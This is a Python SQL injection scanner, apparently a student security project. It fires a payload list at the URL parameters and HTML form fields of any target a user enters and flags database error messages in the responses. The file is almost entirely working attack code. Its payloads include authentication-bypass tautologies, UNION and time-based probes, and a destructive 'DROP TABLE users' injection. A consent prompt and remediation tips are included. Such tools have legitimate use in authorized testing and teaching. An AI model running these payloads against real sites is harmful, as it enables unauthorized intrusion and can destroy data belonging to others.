# -*- coding: utf-8 -*-
"""
Created on Sun May 24 18:33:49 2026

@author: Renuka
"""
#!/usr/bin/env python3
"""
SQL INJECTION VULNERABILITY SCANNER - Cybersecurity Project
Tests web forms and URL parameters for SQL injection vulnerabilities.

Requirements:
    pip install requests beautifulsoup4

Usage:
    python sql_scanner.py

⚠️  LEGAL NOTICE: Only test on systems you OWN or have explicit
    written permission to test. Unauthorized scanning is illegal.
"""

import sys
import time
import urllib.parse
from datetime import datetime

try:
    import requests
    from bs4 import BeautifulSoup
    requests.packages.urllib3.disable_warnings()
except ImportError:
    print("[ERROR] Missing dependencies.")
    print("  Run: pip install requests beautifulsoup4")
    sys.exit(1)


# ─────────────────────────────────────────
#  SQL INJECTION PAYLOADS
# ─────────────────────────────────────────
ERROR_PAYLOADS = [
    "'",
    "''",
    "`",
    "\"",
    "\\",
    "'--",
    "'#",
    "' OR '1'='1",
    "' OR '1'='1'--",
    "' OR '1'='1'#",
    "' OR 1=1--",
    "\" OR \"1\"=\"1",
    "1' ORDER BY 1--",
    "1' ORDER BY 2--",
    "1' ORDER BY 3--",
    "1 UNION SELECT NULL--",
    "1 UNION SELECT NULL,NULL--",
    "' AND SLEEP(3)--",     # Time-based
    "1; DROP TABLE users--",
    "admin'--",
    "admin' #",
    "' OR 'x'='x",
]

# Database error signatures to look for in responses
DB_ERRORS = [
    # MySQL
    "you have an error in your sql syntax",
    "warning: mysql",
    "mysql_fetch",
    "mysql_num_rows",
    "mysql_query",
    # MSSQL
    "microsoft ole db provider for sql",
    "odbc sql server driver",
    "unclosed quotation mark",
    "incorrect syntax near",
    # PostgreSQL
    "pg_query",
    "pg_exec",
    "supplied argument is not a valid postgresql",
    # Oracle
    "ora-01756",
    "ora-00907",
    "quoted string not properly terminated",
    # SQLite
    "sqlite_exception",
    "sqlite error",
    # Generic
    "sql syntax",
    "sql error",
    "syntax error",
    "unexpected token",
    "jdbc",
    "sqlstate",
    "nvarchar",
    "varchar(",
    "[microsoft]",
    "[odbc",
    "[sql",
]

# Results storage
vulnerabilities = []
tested_count = 0


def print_banner():
    print("=" * 60)
    print("   SQL INJECTION SCANNER - Cybersecurity Research Tool")
    print("=" * 60)
    print("  ⚠️  For authorized testing only!")
    print("=" * 60)


def is_vulnerable(response_text):
    """Check if the response contains SQL error signatures."""
    text_lower = response_text.lower()
    for error in DB_ERRORS:
        if error in text_lower:
            return True, error
    return False, None


def test_url_parameters(url, session, timeout=10):
    """Test URL GET parameters for SQL injection."""
    parsed = urllib.parse.urlparse(url)
    params = urllib.parse.parse_qs(parsed.query)

    if not params:
        return []

    found = []
    print(f"\n  Testing URL parameters: {list(params.keys())}")

    for param in params:
        for payload in ERROR_PAYLOADS:
            global tested_count
            tested_count += 1

            # Inject payload into this parameter
            test_params = {p: v[0] for p, v in params.items()}
            test_params[param] = payload

            test_url = urllib.parse.urlunparse((
                parsed.scheme, parsed.netloc, parsed.path,
                parsed.params, urllib.parse.urlencode(test_params), ""
            ))

            try:
                resp = session.get(test_url, timeout=timeout, verify=False)
                vuln, error_sig = is_vulnerable(resp.text)

                if vuln:
                    result = {
                        "type": "GET",
                        "url": test_url,
                        "param": param,
                        "payload": payload,
                        "error": error_sig,
                        "status": resp.status_code,
                    }
                    found.append(result)
                    print(f"  🔴 VULNERABLE! Param: [{param}] Payload: {payload[:30]}")
                    print(f"     Error: {error_sig}")
                    break  # Found vuln in this param, move to next

                time.sleep(0.1)  # Be polite

            except requests.RequestException as e:
                print(f"  [ERR] {e}")

    return found


def test_forms(url, session, timeout=10):
    """Extract and test HTML forms for SQL injection."""
    try:
        resp = session.get(url, timeout=timeout, verify=False)
        soup = BeautifulSoup(resp.text, "html.parser")
        forms = soup.find_all("form")
    except Exception as e:
        print(f"  [ERR] Could not fetch page: {e}")
        return []

    if not forms:
        print("  No forms found on this page.")
        return []

    print(f"\n  Found {len(forms)} form(s)")
    found = []

    for i, form in enumerate(forms, 1):
        action = form.get("action", "")
        method = form.get("method", "get").upper()
        form_url = urllib.parse.urljoin(url, action) if action else url

        inputs = form.find_all("input")
        fields = {}
        for inp in inputs:
            name = inp.get("name")
            val = inp.get("value", "test")
            itype = inp.get("type", "text").lower()
            if name and itype not in ("submit", "button", "image", "file"):
                fields[name] = val

        print(f"\n  Form {i}: {method} → {form_url}")
        print(f"  Fields: {list(fields.keys())}")

        for field in fields:
            for payload in ERROR_PAYLOADS:
                global tested_count
                tested_count += 1

                test_data = dict(fields)
                test_data[field] = payload

                try:
                    if method == "POST":
                        resp = session.post(form_url, data=test_data,
                                          timeout=timeout, verify=False)
                    else:
                        resp = session.get(form_url, params=test_data,
                                         timeout=timeout, verify=False)

                    vuln, error_sig = is_vulnerable(resp.text)

                    if vuln:
                        result = {
                            "type": f"FORM-{method}",
                            "url": form_url,
                            "param": field,
                            "payload": payload,
                            "error": error_sig,
                            "status": resp.status_code,
                        }
                        found.append(result)
                        print(f"  🔴 VULNERABLE! Field: [{field}] Payload: {payload[:30]}")
                        print(f"     Error: {error_sig}")
                        break

                    time.sleep(0.1)

                except requests.RequestException as e:
                    print(f"  [ERR] {e}")

    return found


def print_report(target_url, all_vulns, elapsed):
    print("\n" + "=" * 60)
    print("  SCAN REPORT")
    print(f"  Target   : {target_url}")
    print(f"  Tested   : {tested_count} payload(s)")
    print(f"  Duration : {elapsed:.1f}s")
    print(f"  Found    : {len(all_vulns)} vulnerability(ies)")
    print("=" * 60)

    if not all_vulns:
        print("  ✅ No SQL injection vulnerabilities detected.")
        print("     (This does NOT guarantee the app is secure)")
    else:
        print("\n  🔴 VULNERABILITIES FOUND:\n")
        for i, v in enumerate(all_vulns, 1):
            print(f"  [{i}] Type    : {v['type']}")
            print(f"      URL     : {v['url'][:70]}")
            print(f"      Param   : {v['param']}")
            print(f"      Payload : {v['payload']}")
            print(f"      Error   : {v['error']}")
            print(f"      Status  : {v['status']}")
            print()

        print("  RECOMMENDATIONS:")
        print("  • Use parameterized queries / prepared statements")
        print("  • Validate and sanitize all user inputs")
        print("  • Use an ORM (SQLAlchemy, Hibernate, etc.)")
        print("  • Apply least-privilege DB accounts")
        print("  • Enable WAF (Web Application Firewall)")

    # Save report
    report_file = f"sqli_report_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
    with open(report_file, "w") as f:
        f.write(f"SQL INJECTION SCAN REPORT\n")
        f.write(f"Target: {target_url}\n")
        f.write(f"Date: {datetime.now()}\n")
        f.write(f"Payloads Tested: {tested_count}\n")
        f.write(f"Vulnerabilities Found: {len(all_vulns)}\n\n")
        for v in all_vulns:
            for k, val in v.items():
                f.write(f"  {k}: {val}\n")
            f.write("\n")
    print(f"\n  Report saved: {report_file}")


def main():
    print_banner()

    print("\n  ⚠️  Only test websites you OWN or have written permission to test.")
    confirm = input("  I confirm I have authorization [yes/no]: ").strip().lower()
    if confirm != "yes":
        print("  Exiting. Unauthorized testing is illegal.")
        sys.exit(0)

    target = input("\n  Enter target URL (e.g. http://testsite.com/page?id=1): ").strip()
    if not target.startswith(("http://", "https://")):
        target = "http://" + target

    headers = {
        "User-Agent": "Mozilla/5.0 (Security Scanner)",
        "Accept": "text/html,application/xhtml+xml",
    }

    session = requests.Session()
    session.headers.update(headers)

    print(f"\n  Scanning: {target}")
    print(f"  Started : {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
    print("─" * 60)

    all_vulns = []
    start = time.time()

    # Test URL parameters
    url_vulns = test_url_parameters(target, session)
    all_vulns.extend(url_vulns)

    # Test forms
    print(f"\n  Checking for forms...")
    form_vulns = test_forms(target, session)
    all_vulns.extend(form_vulns)

    elapsed = time.time() - start
    print_report(target, all_vulns, elapsed)


if __name__ == "__main__":
    main()
